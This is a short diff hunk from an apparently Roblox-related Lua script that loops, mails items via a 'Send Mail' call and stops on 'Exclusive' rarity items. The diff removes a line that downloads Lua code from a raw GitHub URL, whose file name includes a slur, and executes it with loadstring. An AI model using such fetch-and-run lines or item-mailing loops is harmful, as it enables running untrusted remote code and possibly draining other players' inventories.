@@ -326,7 +326,7 @@ while wait() do
 			}
 			Invoke("Send Mail", unpack(args))
             wait(5)
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()           
+   
             if v2.rarity == "Exclusive" then
                 break
             end
